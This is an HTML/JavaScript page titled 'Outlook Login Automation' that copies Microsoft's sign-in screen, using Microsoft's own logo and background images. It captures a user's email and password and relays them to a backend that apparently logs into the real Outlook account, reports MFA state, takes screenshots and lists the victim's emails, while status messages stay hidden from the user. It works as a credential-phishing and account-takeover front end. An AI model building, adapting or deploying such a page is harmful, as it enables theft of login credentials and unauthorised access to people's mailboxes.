<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outlook Login Automation</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 0;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .microsoft-logo {
            width: 108px;
            height: auto;
            margin-bottom: 15px;
        }

        .header {
            margin-bottom: 20px;
        }

        .header h1 {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin: 0;
        }

        .back-info {
            margin: 10px 0;
            font-size: 13px;
            color: #323130;
            display: none;
        }

        .back-info.visible {
            display: block;
        }

        .status {
            background: #f8f9ff;
            padding: 15px;
            border-radius: 2px;
            margin-bottom: 20px;
            border-left: 4px solid #0078d4;
            font-size: 13px;
        }

        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }

        .status-indicator.online {
            background: #107c10;
        }

        .status-indicator.offline {
            background: #d13438;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .microsoft-input {
            width: 100%;
            padding: 6px 6px 6px 0;
            border: none;
            border-bottom: 1px solid #0067b8;
            background-color: transparent;
            outline: none;
            font-size: 15px;
            color: #323130;
        }

        .microsoft-input:focus {
            border-bottom: 2px solid #0078d4;
        }

        .microsoft-input::placeholder {
            color: #605e5c;
        }

        .form-links {
            margin: 15px 0;
            font-size: 13px;
        }

        .form-links a {
            color: #0067b8;
            text-decoration: none;
        }

        .form-links a:hover {
            text-decoration: underline;
        }

        .form-links .create-account {
            color: #323130;
        }

        .button-group {
            display: flex;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 20px;
        }

        .btn {
            padding: 6px 32px;
            border: none;
            border-radius: 0;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
        }

        .btn-secondary {
            background-color: #e1e1e1;
            color: #323130;
        }

        .btn-primary {
            background-color: #0078d4;
            color: white;
        }

        .btn:hover:not(:disabled) {
            opacity: 0.9;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .message {
            padding: 12px;
            border-radius: 2px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .message.success {
            background: #dff6dd;
            color: #107c10;
            border: 1px solid #92c5f7;
        }

        .message.error {
            background: #fde7e9;
            color: #a4262c;
            border: 1px solid #a4262c;
        }

        .message.microsoft-error {
            background: transparent;
            color: #d13438;
            border: none;
            padding: 8px 0;
            margin: 8px 0;
            font-size: 13px;
            line-height: 1.4;
        }

        .message.microsoft-error a {
            color: #0067b8;
            text-decoration: underline;
        }

        .message.info {
            background: #deecf9;
            color: #323130;
            border: 1px solid #92c5f7;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .sign-in-options {
            background: white;
            padding: 20px 41px;
            border-radius: 0;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            margin-top: 10px;
            text-align: left;
            font-size: 13px;
            color: #323130;
        }

        .session-info {
            background: #deecf9;
            padding: 12px;
            border-radius: 2px;
            margin-bottom: 15px;
            font-size: 13px;
            border: 1px solid #92c5f7;
        }

        .actions {
            display: none;
            margin-top: 20px;
        }

        .actions.visible {
            display: block;
        }

        .actions .btn {
            width: 100%;
            margin-bottom: 8px;
            padding: 8px 16px;
            border-radius: 2px;
            font-size: 13px;
        }

        .actions .btn.success {
            background-color: #107c10;
            color: white;
        }

        .actions .btn.danger {
            background-color: #d13438;
            color: white;
        }

        .hidden {
            display: none;
        }

        .password-section {
            display: none;
        }

        .password-section.visible {
            display: block;
        }
    </style>
</head>
<body>
    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
        <div class="container">
            <img class="microsoft-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">

            <div class="back-info" id="backInfo">
                ‚Üê <span id="enteredEmail"></span>
            </div>

            <div class="header">
                <h1 id="headerTitle">Sign in</h1>
            </div>

            <!-- Status and messages hidden -->
            <div class="status" style="display: none;">
                <span class="status-indicator" id="statusIndicator"></span>
                <span id="statusText">Checking backend...</span>
            </div>

            <!-- Message area -->
            <div id="messageArea" style="display: none;"></div>

            <!-- Loading indicator -->
            <div class="loading" id="loadingIndicator">
                <div class="spinner"></div>
                <p id="loadingText">Processing...</p>
            </div>

            <!-- Email form -->
            <div id="emailForm">
                <form onsubmit="startLogin(event)">
                    <div class="form-group">
                        <input type="email" id="email" class="microsoft-input" placeholder="Email, phone, or Skype" required>
                    </div>

                    <div class="form-links">
                        <span class="create-account">No account? <a href="#" onclick="return false;">Create one!</a></span><br><br>
                        <a href="#" onclick="return false;">Can't access your account?</a>
                    </div>

                    <div class="button-group">
                        <button type="button" class="btn btn-secondary" onclick="goBack()">Back</button>
                        <button type="submit" class="btn btn-primary" id="nextBtn">Next</button>
                    </div>
                </form>
            </div>

            <!-- Password form -->
            <div id="passwordForm" class="password-section">
                <form onsubmit="continueLogin(event)">
                    <div class="form-group">
                        <input type="password" id="password" class="microsoft-input" placeholder="Password" required>
                    </div>

                    <div class="form-links">
                        <a href="#" onclick="return false;">Forgot my password</a>
                    </div>

                    <div class="button-group">
                        <button type="button" class="btn btn-secondary" onclick="goBackToEmail()">Back</button>
                        <button type="submit" class="btn btn-primary" id="signInBtn">Sign in</button>
                    </div>
                </form>
            </div>

            <!-- Session actions (shown after login starts) -->
            <div class="actions" id="sessionActions">
                <div class="session-info">
                    <strong>Session Active:</strong> <span id="sessionId">-</span>
                </div>

                <button type="button" class="btn success" onclick="takeScreenshot()">
                    üì∏ Take Screenshot
                </button>

                <button type="button" class="btn success" onclick="checkEmails()">
                    üì¨ Check Emails
                </button>

                <button type="button" class="btn btn-secondary" onclick="startNewSession()">
                    üîÑ Start New Session
                </button>

                <button type="button" class="btn danger" onclick="closeSession()">
                    ‚ùå Close Session
                </button>
            </div>
        </div>

        <!-- Sign-in options -->
        <div class="sign-in-options">
            üîí Sign-in options
        </div>
    </div>

    <script>
        let currentSessionId = null;
        let currentStep = 'email'; // 'email' or 'password'
        const API_BASE = '';

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            checkBackendHealth();
            checkSessionStatus();
            preloadOutlook();
        });

        // Utility functions
        function showMessage(message, type = 'info') {
            const messageArea = document.getElementById('messageArea');
            messageArea.style.display = 'block';
            
            // Check if this is a Microsoft-specific error message
            if (type === 'error' && (
                message.includes("We couldn't find an account") ||
                message.includes("That username is incorrect") ||
                message.includes("get a new Microsoft account")
            )) {
                // Format Microsoft error with proper styling and link
                let formattedMessage = message.replace(
                    'get a new Microsoft account',
                    '<a href="#" onclick="return false;">get a new Microsoft account</a>'
                );
                messageArea.innerHTML = `<div class="message microsoft-error">${formattedMessage}</div>`;
            } else {
                messageArea.innerHTML = `<div class="message ${type}">${message}</div>`;
            }
        }

        function clearMessage() {
            const messageArea = document.getElementById('messageArea');
            messageArea.innerHTML = '';
            messageArea.style.display = 'none';
        }

        function setLoading(loading) {
            document.getElementById('loadingIndicator').style.display = loading ? 'block' : 'none';
            document.getElementById('emailForm').style.display = loading ? 'none' : (currentStep === 'email' ? 'block' : 'none');
            document.getElementById('passwordForm').style.display = loading ? 'none' : (currentStep === 'password' ? 'block' : 'none');

            const buttons = document.querySelectorAll('.btn');
            buttons.forEach(btn => btn.disabled = loading);
        }

        function showPasswordForm(email) {
            currentStep = 'password';
            document.getElementById('emailForm').style.display = 'none';
            document.getElementById('passwordForm').className = 'password-section visible';
            document.getElementById('headerTitle').textContent = 'Enter password';
            document.getElementById('backInfo').className = 'back-info visible';
            document.getElementById('enteredEmail').textContent = email;

            // Focus on password field
            setTimeout(() => {
                document.getElementById('password').focus();
            }, 100);
        }

        function showEmailForm() {
            currentStep = 'email';
            document.getElementById('emailForm').style.display = 'block';
            document.getElementById('passwordForm').className = 'password-section';
            document.getElementById('headerTitle').textContent = 'Sign in';
            document.getElementById('backInfo').className = 'back-info';
        }

        function showSessionActions(show) {
            const actions = document.getElementById('sessionActions');
            actions.className = show ? 'actions visible' : 'actions';

            if (!show) {
                showEmailForm();
            } else {
                document.getElementById('emailForm').style.display = 'none';
                document.getElementById('passwordForm').className = 'password-section';
            }
        }

        function goBack() {
            // Placeholder for back functionality
            return false;
        }

        function goBackToEmail() {
            showEmailForm();
            document.getElementById('password').value = '';
        }

        // API Functions
        async function checkBackendHealth() {
            try {
                const response = await fetch(`${API_BASE}/api/health`);
                const data = await response.json();

                if (response.ok) {
                    document.getElementById('statusIndicator').className = 'status-indicator online';
                    document.getElementById('statusText').textContent = 'Backend online - Ready';
                } else {
                    throw new Error('Backend health check failed');
                }
            } catch (error) {
                document.getElementById('statusIndicator').className = 'status-indicator offline';
                document.getElementById('statusText').textContent = 'Backend offline';
                showMessage('Backend is not available. Please check the server.', 'error');
            }
        }

        async function preloadOutlook() {
            try {
                document.getElementById('statusText').textContent = 'Pre-loading Outlook page...';
                showMessage('üöÄ Pre-loading Outlook page for faster email entry...', 'info');

                const response = await fetch(`${API_BASE}/api/preload`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });

                const data = await response.json();

                if (response.ok) {
                    if (data.status === 'preloaded') {
                        document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
                        showMessage('‚úÖ Outlook page pre-loaded! Ready for instant email entry.', 'success');
                    } else if (data.status === 'already-loaded') {
                        document.getElementById('statusText').textContent = 'Outlook page ready - Enter email';
                        showMessage('‚úÖ Outlook page already loaded and ready.', 'success');

                        // If there's already a session, show it
                        if (data.sessionId) {
                            currentSessionId = data.sessionId;
                            document.getElementById('sessionId').textContent = currentSessionId;
                            showSessionActions(true);
                        }
                    }
                } else {
                    throw new Error(data.error || 'Failed to preload');
                }
            } catch (error) {
                document.getElementById('statusText').textContent = 'Backend online - Manual loading';
                console.error('Preload failed:', error);
                // Don't show error to user, just fallback to manual loading
            }
        }

        async function checkSessionStatus() {
            try {
                const response = await fetch(`${API_BASE}/api/status`);
                const data = await response.json();

                if (data.hasActiveSession) {
                    currentSessionId = data.sessionId;
                    document.getElementById('sessionId').textContent = currentSessionId;
                    showSessionActions(true);
                    showMessage('Found existing session. You can take screenshots or start a new session.', 'info');
                }
            } catch (error) {
                console.error('Error checking session status:', error);
            }
        }

        async function startLogin(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;

            clearMessage();
            setLoading(true);

            try {
                const response = await fetch(`${API_BASE}/api/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password: '' })
                });

                const data = await response.json();

                if (response.ok) {
                    currentSessionId = data.sessionId;
                    document.getElementById('sessionId').textContent = currentSessionId;

                    if (data.loginComplete) {
                        if (data.loginSuccess) {
                            showMessage(`‚úÖ ${data.message}`, 'success');
                            showSessionActions(true);
                        } else {
                            showMessage(`‚ö†Ô∏è ${data.message}`, 'error');
                        }
                    } else {
                        // Show site report if available
                        if (data.siteReport) {
                            let reportHtml = `üîÑ ${data.message}<br><br>`;

                            if (data.siteReport.accountExists && data.siteReport.needsPassword) {
                                reportHtml += '‚úÖ Account found! Please enter your password.<br>';
                                showPasswordForm(email);
                            } else {
                                reportHtml += '<strong>üìã Site Report:</strong><br>';

                                if (data.siteReport.accountExists) {
                                    reportHtml += '‚úÖ Account exists<br>';
                                }

                                if (data.siteReport.needsPassword) {
                                    reportHtml += 'üîë Password required<br>';
                                    showPasswordForm(email);
                                }

                                if (data.siteReport.needsMFA) {
                                    reportHtml += 'üì± Multi-factor authentication required<br>';
                                }

                                if (data.siteReport.errorMessages.length > 0) {
                                    reportHtml += '‚ùå Errors found:<br>';
                                    data.siteReport.errorMessages.forEach(error => {
                                        reportHtml += `‚Ä¢ ${error}<br>`;
                                    });
                                }

                                if (data.siteReport.siteResponse) {
                                    reportHtml += `üí¨ Site Response: ${data.siteReport.siteResponse}<br>`;
                                }

                                reportHtml += `üåê Current URL: ${data.siteReport.pageUrl || 'N/A'}<br>`;
                                reportHtml += `üìÑ Page Title: ${data.siteReport.pageTitle || 'N/A'}`;
                            }

                            showMessage(reportHtml, data.siteReport.errorMessages.length > 0 ? 'error' : 'info');
                        } else {
                            showMessage(`üîÑ ${data.message}`, 'info');
                            showPasswordForm(email);
                        }
                    }

                } else {
                    throw new Error(data.error || 'Login failed');
                }

            } catch (error) {
                showMessage(`‚ùå Error: ${error.message}`, 'error');
            } finally {
                setLoading(false);
            }
        }

        async function continueLogin(event) {
            event.preventDefault();

            const password = document.getElementById('password').value;

            if (!password) {
                showMessage('Please enter your password', 'error');
                return;
            }

            clearMessage();
            setLoading(true);

            try {
                const response = await fetch(`${API_BASE}/api/continue-login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password })
                });

                const data = await response.json();

                if (response.ok) {
                    if (data.loginSuccess) {
                        showMessage(`‚úÖ ${data.message}`, 'success');
                        showSessionActions(true);
                    } else {
                        showMessage(`‚ö†Ô∏è ${data.message}`, 'error');
                    }

                    // Clear password field
                    document.getElementById('password').value = '';

                } else {
                    throw new Error(data.error || 'Continue login failed');
                }

            } catch (error) {
                showMessage(`‚ùå Error: ${error.message}`, 'error');
            } finally {
                setLoading(false);
            }
        }

        async function takeScreenshot() {
            clearMessage();
            showMessage('üì∏ Taking screenshot...', 'info');

            try {
                const response = await fetch(`${API_BASE}/api/screenshot`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });

                const data = await response.json();

                if (response.ok) {
                    showMessage(`üì∏ Screenshot saved: ${data.screenshot}`, 'success');
                } else {
                    throw new Error(data.error);
                }
            } catch (error) {
                showMessage(`‚ùå Screenshot failed: ${error.message}`, 'error');
            }
        }

        async function checkEmails() {
            clearMessage();
            showMessage('üì¨ Checking emails...', 'info');

            try {
                const response = await fetch(`${API_BASE}/api/emails`);
                const data = await response.json();

                if (response.ok) {
                    if (data.emails.length > 0) {
                        const emailList = data.emails.slice(0, 5).join('<br>‚Ä¢ ');
                        showMessage(`üì¨ Found ${data.count} emails:<br>‚Ä¢ ${emailList}`, 'success');
                    } else {
                        showMessage('üì≠ No emails found', 'info');
                    }
                } else {
                    throw new Error(data.error);
                }
            } catch (error) {
                showMessage(`‚ùå Email check failed: ${error.message}`, 'error');
            }
        }

        async function startNewSession() {
            if (confirm('This will close the current session and start a new one. Continue?')) {
                await closeSession();
                // Reset forms
                document.getElementById('email').value = '';
                document.getElementById('password').value = '';
                showEmailForm();
                clearMessage();
            }
        }

        async function closeSession() {
            if (!currentSessionId) return;

            try {
                const response = await fetch(`${API_BASE}/api/session`, {
                    method: 'DELETE'
                });

                const data = await response.json();

                if (response.ok) {
                    showMessage('‚úÖ Session closed successfully', 'success');
                } else {
                    showMessage('‚ö†Ô∏è Session may not have closed properly', 'error');
                }
            } catch (error) {
                showMessage(`‚ùå Error closing session: ${error.message}`, 'error');
            } finally {
                currentSessionId = null;
                showSessionActions(false);
                clearMessage();
            }
        }
    </script>
</body>
</html>
